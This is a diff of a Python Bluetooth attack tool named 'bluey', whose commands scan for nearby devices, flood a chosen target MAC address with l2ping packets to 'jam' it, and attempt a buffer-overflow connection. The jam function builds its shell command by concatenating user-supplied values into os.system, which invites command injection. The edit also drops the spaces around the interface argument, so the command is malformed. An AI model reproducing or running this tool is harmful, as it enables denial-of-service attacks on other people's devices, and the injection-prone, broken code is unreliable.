@@ -14,8 +14,7 @@ print("I am not responsible for any damages or misuse from this software.\nThis 
 
 def scan():
     
-   # os.system("hcitool scan")
-   # print("----------------\n")
+    print(" ")
 
     nearby_devices = discover_devices(lookup_names = True)
 
@@ -24,6 +23,7 @@ def scan():
     for name, addr in nearby_devices:
         print (" %s - %s" % (addr, name))
 
+    print(" ")
 
 def force_connect():
     print("attempting connection")
@@ -36,7 +36,7 @@ def force_connect():
 
 def jam():
     print("Starting packet flow")
-    os.system("l2ping -i hci0 -s " + packetsize + " -f " + target)
+    os.system("l2ping -i" + interface + "-s " + packetsize + " -f " + target)
     
 def help_menu():
     print(" \n")
@@ -45,17 +45,18 @@ def help_menu():
     print("scan  ---  scans for bluetooth devices in the area")
     print("jam  ---  jams devices using specified interface, target, and packet size")
     print("forceconnect  ---  tries to cause a buffer overflow connection on vulnerable devices")
-    print("set target  --- sets target MAC address for later use")
-    print("set interface  ---  sets bluetooth interface for use")
-    print("set packetsize  ---  sets packet size for use with the \"jam\" command (in bytes)")
+    print("set target <target>  --- sets target MAC address for later use")
+    print("set interface <interface> ---  sets bluetooth interface for use")
+    print("set packetsize <packet size> ---  sets packet size for use with the \"jam\" command (in bytes)")
     print(" ")
 
 
 while True:
-    prompt = "bluey/> "
+    prompt = "\nbluey/> "
     print(prompt, end="")
 
     command = input().split(" ")
+    print(" ")
     if len(command) >= 3:
         cmd = command[0]
         subcmd = command[1]
